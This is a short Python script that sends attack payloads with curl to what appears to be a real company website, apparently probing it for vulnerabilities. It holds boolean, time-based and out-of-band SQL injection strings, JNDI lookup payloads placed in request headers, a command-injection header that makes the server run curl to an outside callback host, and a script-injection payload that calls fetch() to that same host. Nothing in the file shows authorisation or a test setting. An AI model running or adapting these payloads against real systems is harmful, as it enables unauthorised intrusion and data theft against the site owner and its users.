import urllib.parse, subprocess, time

B = "https://www.infinitycapital.bh"
CB = "oob619eb5bdf5ad.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
PG = "oobbd51fd1f6f3d.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
CM = "oobdb256545ae0f.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

def q(v): return urllib.parse.quote(v, safe="")

tests = [
    # contact?cb  boolean blind + OOB
    ("contact cb true",  B + "/contact?cb=1' AND '1'='1", None),
    ("contact cb false", B + "/contact?cb=1' AND '1'='2", None),
    ("contact cb sleep", B + "/contact?cb=1' AND SLEEP(4)-- -", None),
    ("contact cb oob",  B + "/contact?cb=1' AND (SELECT LOAD_FILE(CONCAT('//" + CB + "/x')))-- -", None),
    ("contact cb utl",  B + "/contact?cb=1' AND UTL_INADDR.GET_HOST_ADDRESS('" + CB + "')-- -", None),
    # home ?page
    ("home page true",  B + "/?page=2 AND 1=1", None),
    ("home page false", B + "/?page=2 AND 1=2", None),
    ("home page oob",   B + "/?page=2' AND (SELECT LOAD_FILE(CONCAT('//" + PG + "/x')))-- -", None),
    # CMDI / JNDI via headers on /api/send
    ("jndi UA",   B + "/", ["-H", "User-Agent: ${jndi:ldap://" + CM + "/a}"]),
    ("jndi Referer", B + "/", ["-H", "Referer: ${jndi:ldap://" + CM + "/b}"]),
    ("cmdi UA curl", B + "/", ["-H", "User-Agent: x;curl http://" + CM + "/cmdi;"]),
    ("xss contact q", B + "/contact?q=" + q('<script>fetch("http://' + CM + '/xss")</script>'), None),
]

for name, url, extra in tests:
    args = ["curl","-sk","--max-time","25","-o","/tmp/b","-w","%{http_code}|%{size_download}|%{time_total}"]
    if extra: args += extra
    args.append(url)
    p = subprocess.run(args, capture_output=True, text=True)
    body = ""
    try: body = open("/tmp/b","rb").read()[:120]
    except Exception: pass
    print(f"{name:20s} {p.stdout:28s} {body!r}")
    time.sleep(0.4)
